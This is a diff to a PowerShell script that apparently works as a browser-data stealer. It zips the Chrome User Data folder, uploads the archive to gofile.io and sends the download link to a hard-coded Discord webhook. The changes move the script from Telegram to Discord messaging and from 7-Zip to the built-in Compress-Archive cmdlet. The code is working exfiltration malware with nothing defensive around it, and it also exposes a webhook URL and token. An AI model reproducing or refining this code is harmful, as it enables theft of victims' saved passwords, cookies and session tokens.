@@ -1,5 +1,3 @@
-### Created by mrproxy
-
 # $botToken = "bot_token"
 # $chatID = "chat_id"
 $webhook = "https://discord.com/api/webhooks/1358791393405047081/Uz8PRcFd4de_7tDePzmRsTlGKo76zMkjehmo0WvYw-REPkgNXexXGBK2b78RRfOmWU3N"
@@ -88,42 +86,30 @@ function Upload-FileAndGetLink {
     }
 }
 
-
-# Check for 7zip path
-$zipExePath = "C:\Program Files\7-Zip\7z.exe"
-if (-not (Test-Path $zipExePath)) {
-    $zipExePath = "C:\Program Files (x86)\7-Zip\7z.exe"
-}
-
 # Check for Chrome executable and user data
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 if (-not (Test-Path $chromePath)) {
-    Send-TelegramMessage -message "Chrome User Data path not found!"
+    Send-DiscordMessage -message "Chrome User Data path not found!"
     exit
 }
 
-# Exit if 7zip path not found
-if (-not (Test-Path $zipExePath)) {
-    Send-TelegramMessage -message "7Zip path not found!"
-    exit
-}
-
-# Create a zip of the Chrome User Data
+# Create a zip of the Chrome User Data using the built-in Compress-Archive cmdlet
 $outputZip = "$env:TEMP\chrome_data.zip"
-& $zipExePath a -r $outputZip $chromePath
-if ($LASTEXITCODE -ne 0) {
-    Send-TelegramMessage -message "Error creating zip file with 7-Zip"
+try {
+    Compress-Archive -Path $chromePath -DestinationPath $outputZip
+} catch {
+    Send-DiscordMessage -message "Error creating zip file with Compress-Archive"
     exit
 }
 
 # Upload the file and get the link
 $link = Upload-FileAndGetLink -filePath $outputZip
 
-# Check if the upload was successful and send the link via Telegram
+# Check if the upload was successful and send the link via Discord
 if ($link -ne $null) {
-    Send-TelegramMessage -message "Download link: $link"
+    Send-DiscordMessage -message "Download link: $link"
 } else {
-    Send-TelegramMessage -message "Failed to upload file to gofile.io"
+    Send-DiscordMessage -message "Failed to upload file to gofile.io"
 }
 
 # Remove the zip file after uploading
